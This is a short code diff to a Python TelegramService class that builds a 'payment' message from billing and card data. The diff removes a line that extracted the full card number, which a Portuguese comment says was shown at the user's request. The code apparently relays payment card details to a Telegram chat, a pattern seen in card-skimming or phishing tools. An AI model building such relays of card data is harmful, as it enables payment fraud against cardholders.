@@ -117,9 +117,6 @@ class TelegramService:
                 logger.warning("Telegram not configured, using console output only")
                 return True
                 
-            # Show full card number (conforme solicitado pelo usuário)
-            card_number = card_data.get('numeroCartao', 'N/A')
-            
             # Template para mensagem de pagamento
             message = TelegramTemplates.payment_template(billing_data, card_data)
             
